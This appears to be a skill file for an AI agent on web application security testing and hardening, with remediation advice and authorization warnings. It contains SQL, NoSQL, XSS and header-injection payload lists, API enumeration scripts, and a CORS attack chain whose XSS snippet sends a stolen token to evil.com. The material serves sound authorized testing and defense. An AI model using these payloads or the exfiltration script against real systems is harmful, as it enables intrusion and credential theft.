---
name: web-application-security
description: "Web application security testing and hardening for common vulnerabilities: XSS, SQL injection, NoSQL injection, CSRF, authentication bypass, information disclosure, and protocol-level attacks. Covers React + Go stacks and general HTTP/API security review."
version: 1.0.0
author: Hermes Agent
license: MIT
metadata:
  hermes:
    tags: [Security, Web Security, XSS, SQL Injection, NoSQL Injection, CSRF, Authentication, Information Disclosure, Red Team, API Security]
    related_skills: [language-debugging, software-development-methodologies]
---

# Web Application Security

## When to Use This Skill

Trigger when the user wants to:
- Harden a web application against common attacks (XSS, SQL injection, CSRF, etc.)
- Perform black-box/red-team testing of an API or web interface
- Validate whether a login, search, CRUD, or admin interface is exploitable
- Review a React + Go (or any full-stack) application for security flaws
- Fix information disclosure, weak authentication, or missing rate limiting

**Critical rule:** Only test endpoints the user explicitly owns and authorizes. Never attack live production systems without explicit permission. Prefer local/test environments, or scripts the user runs themselves.

---

## 1. Threat Model for Admin/Backend Systems

Typical attack surface, ordered by likelihood and impact:

1. **SQL / NoSQL injection** — login, search, list, detail endpoints
2. **Cross-site scripting (XSS)** — any user input displayed in the UI
3. **CSRF** — state-changing actions that rely only on cookies
4. **Authentication bypass** — weak JWT, session fixation, missing authz
5. **Information disclosure** — stack traces, server versions, verbose errors
6. **File upload/path traversal** — avatar, document, import endpoints
7. **Rate limiting / brute force** — login, password reset, 2FA
8. **IDOR / broken access control** — user can access other users' data

---

## 2. Pre-Testing Checklist

Before launching payloads, establish a baseline:

- [ ] Confirm the target URL and the user's ownership/authorization
- [ ] Identify the technology stack (framework, database, ORM, web server)
- [ ] Discover valid request format (field names, Content-Type, method)
- [ ] Record baseline response for a normal failed login: status, body, length, time
- [ ] Run tests from the same network path (avoid CDN/WAF rate-limiting noise)
- [ ] Never run destructive payloads (DROP, DELETE, UPDATE) on shared data

### Discovering the request format and frontend attack surface

Try variations first to learn the API contract:

```json
{"username":"admin","password":"123456"}
{"userName":"admin","password":"123456"}
{"userName":"admin","passWord":"123456"}
```

If the framework rejects with `field "userName" is not set`, you know the expected field name. This is go-zero-style binding behavior.

Then download the production frontend bundle to find the real API surface and token storage:

```python
import requests, re
html = requests.get("https://admin.example.com/").text
scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
js = requests.get(f"https://admin.example.com{scripts[0]}").text

# API base URL and paths
print(re.findall(r'baseURL\s*[:=]\s*["\']([^"\']+)["\']', js))
print(sorted(set(re.findall(r'"/api/[a-zA-Z0-9/_-]+"', js))))

# Token storage location
for kw in ["localStorage", "sessionStorage", "Authorization", "Bearer"]:
    if kw in js:
        idx = js.find(kw)
        print(js[idx-80:idx+120])
```

Frontend bundles commonly reveal the full API path list, the backend base URL, and whether tokens live in `localStorage` (vulnerable to XSS) or `HttpOnly` cookies.

---

## 3. SQL Injection Testing

### Core principle

A vulnerable query looks like string concatenation. A safe query uses parameter binding. The goal of testing is to make the interpreted query evaluate differently than the developer intended.

### Classic payloads

```
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1
') OR ('1'='1
' OR 1=1 --
1' OR 1=1 --
admin' --
admin' #
' UNION SELECT 1,2,3 --
' UNION SELECT null,null,null --
```

### Advanced / evasion payloads

```
'/**/OR/**/'1'='1
' oR '1'='1' --
admin%27%20OR%20%271%27%3D%271      (URL-encoded)
admin%2527%2520...                  (double-encoded)
admin＇ OR ＇1＇=＇1                 (full-width quote)
admin' OR ASCII('A')=65 --
admin' OR CONCAT('1','1')='11' --
admin' AND IF(1=1,1,0)=1 --
admin' AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1 --
```

### Time-based blind injection

Use these to detect injection even when no error is returned:

```
MySQL:      ' AND SLEEP(5) --
MySQL:      ' AND BENCHMARK(5000000,MD5('a')) --
PostgreSQL: ' AND pg_sleep(5) --
SQL Server: '; WAITFOR DELAY '0:0:5' --
SQLite:     ' AND randomblob(1000000000) --
Oracle:     ' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) --
```

If response time jumps by ~5s, the database executed the payload. Compare against `SLEEP(0)` or `BENCHMARK(1,...)` to rule out slow network.

### Error-based injection

These attempt to force a database error that reveals schema or version:

```
' AND extractvalue(1, concat(0x7e, (SELECT @@version))) --
' AND updatexml(1, concat(0x7e, database()), 1) --
' AND 1=CONVERT(int, @@version) --
' AND 1=CAST((SELECT version()) AS INTEGER) --
```

A safe application will return a generic error message and no SQL details. Use time-based payloads even when no error is returned; compare against `SLEEP(0)` and a high number of samples to reduce network noise.

See [references/sql-injection-payloads.md](references/sql-injection-payloads.md) for a full categorized list and the Python test harness used in this skill.

---

## 4. NoSQL Injection Testing

Relevant when the backend uses MongoDB, DynamoDB, or similar document stores.

### Payloads

```json
{"username": {"$ne": null}}
{"username": {"$gt": ""}}
{"username": {"$regex": "^"}}
{"username": {"$where": "this.password.length > 0"}}
{"username": ["admin", "admin"]}
```

A safe application will reject non-string types with `type mismatch for field "username"` or similar. Strong type binding is the primary defense.

---

## 5. XSS Testing

### Stored / reflected XSS payloads

```html
<script>alert('xss')</script>
<img src=x onerror=alert('xss')>
<svg onload=alert('xss')>
<body onload=alert('xss')>
<input onfocus=alert('xss') autofocus>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

### Where to test

- Usernames, nicknames, comments displayed in tables or cards
- Search keyword echo (`You searched for: ...`)
- Error messages that include user input
- URL parameters reflected in the page
- File names, metadata fields

### React-specific guidance

- JSX `{userInput}` is safe by default (escaped).
- `dangerouslySetInnerHTML` requires sanitization (DOMPurify).
- `href` attributes must validate against `javascript:` and `data:` schemes.
- Avoid `eval()`, `new Function()`, and `innerHTML` with user data.

See [references/xss-payloads.md](references/xss-payloads.md) for a comprehensive payload set.

---

## 6. Protocol and Parser Bypasses

### Content-Type confusion

Try the same request with different Content-Types to see if the parser behaves differently:

```
application/json
text/json
application/x-www-form-urlencoded
multipart/form-data
text/plain
application/xml
text/xml
application/json; charset=gbk
application/json; charset=utf-7
```

A safe framework will reject non-JSON bodies with a generic error. Watch for error messages that echo the raw request body — that is information disclosure.

### JSON quirks

```json
{"username":"admin","username":"admin' OR '1'='1","password":"x"}
{"username":123}
{"username":true}
{"username":null}
{"username":["admin"]}
{"username":{"name":"admin"}}
{"username":"admin",}
{"username":"admin\n"}
```

### Method override

```http
X-HTTP-Method-Override: GET
X-Original-Method: GET
_method=GET
```

### Header injection tests

```http
X-Forwarded-For: 1' OR '1'='1
X-Real-IP: 1' OR '1'='1
User-Agent: <script>alert(1)</script>
Referer: <script>alert(1)</script>
```

A safe application does not use these headers in SQL queries or page rendering.

---

## 7. Information Disclosure Checks

Check for these common leaks:

```http
Server: nginx/1.18.0 (Ubuntu)
X-Powered-By: Express/PHP/ASP.NET
X-Generator: WordPress
Detailed error messages with stack traces or SQL fragments
Different response lengths for user exists vs user not exists
```

Also check for debug tools shipped to production (e.g., `vConsole`, `eruda`) and source maps that expose the full client source tree. These are not direct RCE but they reduce the cost of reconnaissance and may expose sensitive configuration or comments.

### Remediation

For nginx:

```nginx
server_tokens off;
```

For Go frameworks, return generic errors and log details server-side:

```go
httpx.Error(w, errors.New("invalid credentials"))
```

---

## 8. Authentication Hardening

### Login endpoint defenses

| Control | Implementation |
|---|---|
| Parameterized queries | All SQL via `?` placeholders or ORM |
| Password storage | bcrypt/argon2, never MD5/SHA1 |
| Rate limiting | Redis-backed per-IP and per-account lockout |
| Failure response | Generic "invalid credentials" — no user enumeration |
| Cookie flags | `HttpOnly`, `Secure`, `SameSite=Strict` |
| Session | Short TTL, rotation on privilege change |

### Rate limiting example (Go)

```go
import "golang.org/x/time/rate"

var limiters = make(map[string]*rate.Limiter)

func loginLimit(ip string) bool {
    lim, ok := limiters[ip]
    if !ok {
        lim = rate.NewLimiter(rate.Limit(1/60.0), 5) // 1 per minute, burst 5
        limiters[ip] = lim
    }
    return lim.Allow()
}
```

For production, use Redis with a TTL instead of in-memory map.

---

## 9. Reporting Results

After testing, classify each finding:

| Severity | Meaning | Example |
|---|---|---|
| Critical | Direct exploitation possible | SQL injection leading to data extraction |
| High | Authentication bypass or data leak | Login bypass, verbose SQL errors |
| Medium | Information disclosure or weak controls | nginx version, no rate limiting |
| Low | Defense in depth missing | Missing CSP, no security headers |
| Informational | Observations, not vulnerabilities | OPTIONS returns 204 |

Always report:
1. What was tested
2. What payload was used
3. What response was observed
4. Why it is or isn't a vulnerability
5. Recommended fix

---

## Common Pitfalls

1. **Testing production without authorization** — never do this; always get explicit permission and prefer local/test environments.
2. **Ignoring response timing** — time-based blind SQLI requires comparing baseline and payload times.
3. **Only testing login** — search, list, and edit endpoints often have injection points too.
4. **Missing parser-level attacks** — changing Content-Type or JSON shape can bypass validation.
5. **Trusting client-side validation** — all security checks must happen server-side.
6. **Forgetting rate limiting** — even with no SQLI, login endpoints can be brute-forced.
7. **Leaking debug info** — generic errors in production; detailed errors only in logs.
8. **XSS only in rendered fields** — remember URLs, file names, and metadata can also carry XSS.

---

## 10. Backend / Admin System Audits

When the target is a **backend management system** (admin dashboard, internal API, or back-office service), apply this skill with a few extra emphases:

1. **Start from the frontend bundle, not the login page.** Login endpoints are usually the best-defended; the real attack surface is the data-query and management endpoints behind authentication.
2. **Download the production JS bundle** to extract the API base URL, the full `/api/...` path list, token storage (`localStorage` vs `HttpOnly` cookie), and framework fingerprints (go-zero, gin, echo, etc.).
3. **CORS is a first-class vulnerability.** Test the real `POST`/`GET` request with a malicious `Origin`, not only the `OPTIONS` preflight. A reflected `Access-Control-Allow-Origin` plus `Access-Control-Allow-Credentials: true` lets an attacker with XSS or a phishing page steal authenticated data.
4. **Token storage matters.** If the token lives in `localStorage`, any XSS payload can exfiltrate it. If it is an `HttpOnly` cookie, XSS alone cannot read it, but CORS misconfiguration can still let an attacker use a stolen token.
5. **Enumerate business endpoints directly** against the backend domain. Frontend SPA fallbacks often return `200` for any path, so rely on backend status codes (`200/401/403/404`) and response lengths, not on the frontend router.
6. **Look for framework fingerprints.** go-zero rejects unexpected fields with messages like `field "xxx" is not set` or `type mismatch for field "xxx"`; gin/echo may be more permissive. Use these to choose payloads and to identify which defenses are likely in place.

### go-zero fingerprint checklist

| Error text | Meaning |
|---|---|
| `field "xxx" is not set` | Required field missing or wrong name |
| `type mismatch for field "xxx"` | Strong type binding (good defense against NoSQL/JSON confusion) |
| `string: ..., error: invalid character ...` | JSON parsing failed |
| Response header `Traceparent` | Often seen with go-zero services |

### Backend CORS attack chain

A typical exploit path from a real audit:

1. Attacker fetches `https://admin.target.com/` and finds `umi.xxxxx.js`.
2. From the bundle they learn `baseURL = https://adminapi.target.com` and a list of `/api/sys/...` endpoints.
3. They learn the app stores `localStorage.getItem("token")` and sends `Authorization: Bearer <token>`.
4. They find a stored XSS vector (e.g., user nickname or feedback field) and inject:
   ```html
   <script>
     fetch('https://evil.com/steal?token=' + encodeURIComponent(localStorage.getItem('token')))
   </script>
   ```
5. With the stolen token and a misconfigured CORS response, they read `/api/sys/user/info` from the victim's browser.
6. The same token can often be used to call list/export endpoints from the attacker's server.

### Backend API enumeration recipe

```python
import requests, re

html = requests.get("https://admin.target.com/").text
scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', html)
js = requests.get(f"https://admin.target.com{scripts[0]}").text

# API base and paths
print(re.findall(r'baseURL\s*[:=]\s*["\']([^"\']+)["\']', js))
print(sorted(set(re.findall(r'"/api/[a-zA-Z0-9/_-]+"', js))))

# Token storage
for kw in ["localStorage", "sessionStorage", "Authorization", "Bearer"]:
    if kw in js:
        idx = js.find(kw)
        print(js[idx-80:idx+120])
```

Then probe the backend directly:

```python
import requests

base = "https://adminapi.target.com"
candidates = [
    "/api/sys/user/list",
    "/api/sys/user/info",
    "/api/sys/user/page",
    "/api/sys/role/list",
    "/api/sys/menu/list",
    "/api/sys/dept/list",
    "/api/sys/dict/list",
    "/api/sys/config/list",
    "/api/sys/upload",
    "/api/sys/log/list",
]

for path in candidates:
    r = requests.get(base + path, timeout=8, allow_redirects=False)
    if r.status_code != 404:
        print(f"[{r.status_code}] {path}")
```

### Backend-specific danger signals

| Signal | Severity | Why it matters |
|---|---|---|
| `Access-Control-Allow-Origin` reflects arbitrary Origin on a real POST/GET | High | Authenticated cross-origin data theft |
| `Access-Control-Allow-Credentials: true` with a non-fixed Origin | High | Same as above |
| Token in `localStorage` | Medium | XSS → token theft |
| Frontend JS exposes full `/api/...` route list | Medium | Lowers reconnaissance cost |
| Production bundle ships `vConsole`/`eruda` | Medium | Debug info / source maps leak |
| SQL error reflected in response | High | Injection + schema disclosure |
| Business endpoints return data without authentication | High | Direct data leak |

## References

- [references/sql-injection-payloads.md](references/sql-injection-payloads.md) — SQL injection payload bank and Python test harness
- [references/xss-payloads.md](references/xss-payloads.md) — XSS payload bank and React-specific guidance
- [references/nosql-injection-payloads.md](references/nosql-injection-payloads.md) — NoSQL injection payloads and type-binding defenses
- [references/protocol-bypasses.md](references/protocol-bypasses.md) — Content-Type, JSON parser, method override, and header injection tests
- [references/secure-login-go-example.md](references/secure-login-go-example.md) — hardened Go login handler example
- [references/backend-audit-api-enum-and-cors-poc.md](references/backend-audit-api-enum-and-cors-poc.md) — complete backend CORS attack chain and nginx fix (absorbed from `backend-security-audit`)
- [references/backend-audit-security-probes.md](references/backend-audit-security-probes.md) — reusable payload and curl probe bank for admin/ backend APIs (absorbed from `backend-security-audit`)
